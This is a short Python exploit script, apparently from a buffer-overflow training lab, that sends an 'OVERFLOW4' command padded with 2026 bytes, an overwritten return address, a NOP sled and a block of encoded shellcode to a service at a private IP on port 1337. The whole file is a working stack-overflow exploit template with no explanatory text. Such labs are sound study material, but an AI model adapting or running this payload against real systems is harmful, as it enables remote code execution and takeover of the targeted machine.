import socket, sys, time


ip = '10.0.2.57'	# Change this
port = 1337		# Change this

buffer = b'OVERFLOW4 '
buffer += b'A' * 2026
retn = b'\xaf\x11\x50\x62'
padding = b'\x90' * 16
shellcode =  b""
shellcode += b"\xd9\xc8\xbd\xca\x3b\x45\xc8\xd9\x74\x24\xf4"
shellcode += b"\x5a\x31\xc9\xb1\x31\x31\x6a\x18\x83\xc2\x04"
shellcode += b"\x03\x6a\xde\xd9\xb0\x34\x36\x9f\x3b\xc5\xc6"
shellcode += b"\xc0\xb2\x20\xf7\xc0\xa1\x21\xa7\xf0\xa2\x64"
shellcode += b"\x4b\x7a\xe6\x9c\xd8\x0e\x2f\x92\x69\xa4\x09"
shellcode += b"\x9d\x6a\x95\x6a\xbc\xe8\xe4\xbe\x1e\xd1\x26"
shellcode += b"\xb3\x5f\x16\x5a\x3e\x0d\xcf\x10\xed\xa2\x64"
shellcode += b"\x6c\x2e\x48\x36\x60\x36\xad\x8e\x83\x17\x60"
shellcode += b"\x85\xdd\xb7\x82\x4a\x56\xfe\x9c\x8f\x53\x48"
shellcode += b"\x16\x7b\x2f\x4b\xfe\xb2\xd0\xe0\x3f\x7b\x23"
shellcode += b"\xf8\x78\xbb\xdc\x8f\x70\xb8\x61\x88\x46\xc3"
shellcode += b"\xbd\x1d\x5d\x63\x35\x85\xb9\x92\x9a\x50\x49"
shellcode += b"\x98\x57\x16\x15\xbc\x66\xfb\x2d\xb8\xe3\xfa"
shellcode += b"\xe1\x49\xb7\xd8\x25\x12\x63\x40\x7f\xfe\xc2"
shellcode += b"\x7d\x9f\xa1\xbb\xdb\xeb\x4f\xaf\x51\xb6\x05"
shellcode += b"\x2e\xe7\xcc\x6b\x30\xf7\xce\xdb\x59\xc6\x45"
shellcode += b"\xb4\x1e\xd7\x8f\xf1\xc1\x35\x1a\x0f\x6a\xe0"
shellcode += b"\xcf\xb2\xf7\x13\x3a\xf0\x01\x90\xcf\x88\xf5"
shellcode += b"\x88\xa5\x8d\xb2\x0e\x55\xff\xab\xfa\x59\xac"
shellcode += b"\xcc\x2e\x3a\x33\x5f\xb2\x93\xd6\xe7\x51\xec"



payload = buffer + retn + padding + shellcode

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(5)
        s.connect((ip, port))
        #s.recv(1024)
        print('Sending payload')
        s.send(payload)
        s.recv(1024)
except Exception as e:
    print(e)
    sys.exit(0)
